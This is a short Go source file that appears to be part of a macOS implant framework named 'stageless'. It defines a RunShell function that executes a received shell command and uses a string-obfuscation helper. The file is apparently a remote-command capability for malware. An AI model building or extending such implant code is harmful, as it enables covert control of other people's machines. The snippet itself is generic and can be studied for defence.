package capabilities

import (
	"stageless/utils/macapi"
	"stageless/utils/obf"
)

func RunShell(args string) []byte {
	// Receives a shell command and runs it
	if args == "" {
		return WriteMsg(obf.S("Error: empty command"))
	}
	return macapi.ExecPosix(args, "")
}
